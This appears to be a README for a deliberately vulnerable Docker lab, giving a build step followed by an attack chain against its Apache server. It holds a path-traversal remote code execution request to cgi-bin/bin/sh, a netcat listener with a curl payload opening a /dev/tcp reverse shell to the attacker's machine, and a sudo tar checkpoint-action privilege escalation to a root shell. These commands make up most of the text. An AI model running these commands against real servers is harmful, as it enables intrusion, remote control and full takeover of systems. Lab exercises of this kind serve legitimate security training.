# Build and start the vulnerable docker :

:warning: You have to run the build script with sudo or as root or as a user that is part of the docker group :warning:

```bash
./build.sh
```

# RCE via Apache server :

```bash
curl -s --path-as-is 'http://<host IP>:4444/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'
```

# Reverse shell via Apache Server :
##  Step 1 :
  
  On your host, set up a listener :

```bash
nc -nvlp <port>
```

##  Step2 :

  On your host, use curl to execute code on the Apache Server :

```bash
curl -s --path-as-is 'http://<host IP>:4444/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; bash -c "/bin/sh -i >& /dev/tcp/<your host IP>/<your listener port> 0>&1"'
```

# Privesc

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
